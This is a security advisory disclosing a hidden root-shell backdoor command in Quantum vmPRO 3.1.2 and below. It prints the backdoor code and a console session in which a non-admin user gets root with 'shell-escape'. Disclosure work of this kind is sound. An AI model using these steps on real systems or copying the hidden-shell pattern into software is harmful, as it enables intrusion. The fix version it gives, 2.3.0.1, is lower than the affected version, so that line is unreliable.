@@ -1,0 +1,85 @@
+-----------
+Author:
+-----------
+
+xistence < xistence[at]0x90[.]nl >
+
+-------------------------
+Affected products:
+-------------------------
+
+Quantum vmPRO 3.1.2 and below
+
+-------------------------
+Affected vendors:
+-------------------------
+
+Quantum
+http://quantum.com/
+
+-------------------------
+Product description:
+-------------------------
+
+Unlike traditional backup applications and other backup applications
+designed for virtual environments,
+Quantum vmPRO Software backs up VMs in native VMware format. This enables
+users to restore or boot VMs
+in seconds without the use of a backup application, reduces virtual server
+and network usage by reducing
+VM image sizes before backing up those images to backup storage, and
+substantially reduces the cost of
+using traditional backup applications to back up virtual environments.
+
+----------
+Details:
+----------
+
+[ 0x01 - Shell Backdoor Command ]
+
+The file "/usr/local/pancetera/bin/cmd_processor.py" on the vmPRO 3.1.2
+virtual machine contains the following lines:
+
+    def cmd_shell_escape(self, args):
+        log_panshell(syslog.LOG_INFO, "internal consistency check started")
+        env = dict(os.environ)
+        env['SHELL'] = '/bin/bash'
+        env['HOME']  = '/tmp'
+        env['TERM']  = 'xterm'
+        os.spawnle(os.P_WAIT, '/bin/bash', 'bash', env)
+        log_panshell(syslog.LOG_INFO, "internal consistency check finished")
+        return
+
+This is a hidden command to gain a root shell. If we create a user in the
+web interface without administrator rights,
+we can still ssh and gain a root shell! This of course should not be
+possible and only be accessible to an admin user.
+
+$ ssh non-admin@192.168.2.112
+non-admin@192.168.2.112's password:
+Last login: Thu Dec 19 23:42:10 2013 from 192.168.2.72
+Welcome to Quantum vmPRO Console
+--------------------------------
+
+Quantum vmPRO GUI: https://192.168.2.112/
+
+*** Type 'help' for a list of commands.
+
+quantum:localhost> shell-escape
+bash-4.1# id
+uid=0(root) gid=100(users) groups=0(root),100(users)
+
+
+-----------
+Solution:
+-----------
+
+Upgrade to version 2.3.0.1 or newer
+
+--------------
+Timeline:
+--------------
+
+03-01-2014 - Issues discovered and vendor notified
+15-01-2014 - No reply, asked for status update.
+17-03-2014 - No replies, public disclosure
